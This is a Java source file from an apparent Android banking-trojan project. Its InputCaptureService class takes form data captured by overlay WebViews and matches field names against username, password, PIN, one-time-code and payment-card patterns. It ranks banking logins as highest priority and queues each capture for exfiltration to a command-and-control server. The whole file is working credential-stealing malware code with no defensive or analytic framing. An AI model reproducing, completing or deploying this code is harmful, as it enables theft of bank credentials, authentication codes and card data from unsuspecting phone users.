package com.fason.app.features.springe.capture;

import android.util.Log;

import com.fason.app.features.springe.data.ExfilQueue;

import org.json.JSONObject;

/**
 * InputCaptureService — Captures credentials and form data from overlays.
 *
 * Receives data from WebViewOverlay's JavaScript bridge and:
 * - Validates and sanitises captured fields
 * - Detects common credential patterns (username, password, PIN, OTP, card)
 * - Flags high-value captures for priority exfiltration
 * - Queues data to ExfilQueue for delivery to C2
 *
 * Thread-safe: all incoming capture events are processed on the calling thread
 * (which is a WebView background thread), with minimal overhead.
 */
public final class InputCaptureService {

    private static final String TAG = "InputCapture";

    private final ExfilQueue exfilQueue;
    private volatile int captureCount = 0;

    // Known field name patterns for credential detection
    private static final String[] PATTERN_USERNAME = {
        "user", "username", "email", "login", "account", "userId", "customerId",
        "identifier", "mobile", "phone", "cardholder"
    };
    private static final String[] PATTERN_PASSWORD = {
        "pass", "password", "pwd", "secret", "pin", "mpin", "pinCode",
        "securityCode", "passcode", "passwd"
    };
    private static final String[] PATTERN_OTP = {
        "otp", "token", "mfa", "2fa", "totp", "verification", "verify",
        "smsCode", "authCode", "oneTimePin", "secureCode"
    };
    private static final String[] PATTERN_CARD = {
        "card", "ccnum", "credit", "debit", "cardNumber", "cvv", "cvc",
        "expiry", "exp", "pan", "iban"
    };

    public InputCaptureService(ExfilQueue exfilQueue) {
        this.exfilQueue = exfilQueue;
    }

    /**
     * Called from WebViewOverlay.JsBridge when form data is captured.
     * Processes and queues the data for exfiltration.
     */
    public void onCaptured(JSONObject data) {
        if (data == null) return;

        try {
            // Add metadata
            data.put("_captureId", System.currentTimeMillis());
            captureCount++;

            // Detect the type of credential captured
            String captureType = classifyCapture(data);
            data.put("_captureType", captureType);

            // Calculate priority level
            int priority = getPriority(captureType);
            data.put("_priority", priority);

            // Add to exfiltration queue
            exfilQueue.enqueue(data, priority);

            Log.d(TAG, "Captured [" + captureType + "] prio=" + priority
                + " fields=" + data.length()
                + " total=" + captureCount);

        } catch (Exception e) {
            Log.e(TAG, "Error processing captured data", e);
        }
    }

    public int getCaptureCount() { return captureCount; }

    /**
     * Classify the captured data based on field name patterns.
     */
    private String classifyCapture(JSONObject data) {
        try {
            // Check if form_submit type
            String type = data.optString("_type", "");

            // For field_change events, classify the single field
            if ("field_change".equals(type)) {
                String field = data.optString("field", "").toLowerCase();
                return classifyField(field);
            }

            // For form_submit, check all fields
            boolean hasPassword = false;
            boolean hasUsername = false;
            boolean hasOtp = false;
            boolean hasCard = false;
            boolean hasPin = false;

            java.util.Iterator<String> keys = data.keys();
            while (keys.hasNext()) {
                String key = keys.next();
                if (key.startsWith("_")) continue; // Skip internal keys
                String fieldType = classifyField(key);
                switch (fieldType) {
                    case "password": hasPassword = true; break;
                    case "pin": hasPin = true; break;
                    case "username": hasUsername = true; break;
                    case "otp": hasOtp = true; break;
                    case "card": hasCard = true; break;
                }
            }

            if (hasPin && hasUsername) return "banking_login";
            if (hasPassword && hasUsername) return "full_credentials";
            if (hasCard) return "payment_card";
            if (hasOtp) return "otp_code";
            if (hasPassword) return "password_only";
            if (hasPin) return "pin_code";
            return "form_data";

        } catch (Exception e) {
            return "unknown";
        }
    }

    private String classifyField(String fieldName) {
        String lower = fieldName.toLowerCase();
        for (String p : PATTERN_CARD) { if (lower.contains(p)) return "card"; }
        for (String p : PATTERN_OTP) { if (lower.contains(p)) return "otp"; }
        for (String p : PATTERN_PASSWORD) { if (lower.contains(p)) return "password"; }
        for (String p : PATTERN_USERNAME) { if (lower.contains(p)) return "username"; }
        return "other";
    }

    /**
     * Priority: higher numbers = more urgent exfiltration.
     */
    private int getPriority(String captureType) {
        switch (captureType) {
            case "banking_login": return 100;
            case "full_credentials": return 90;
            case "payment_card": return 85;
            case "otp_code": return 80;
            case "pin_code": return 75;
            case "password_only": return 60;
            case "form_data": return 40;
            default: return 30;
        }
    }
}
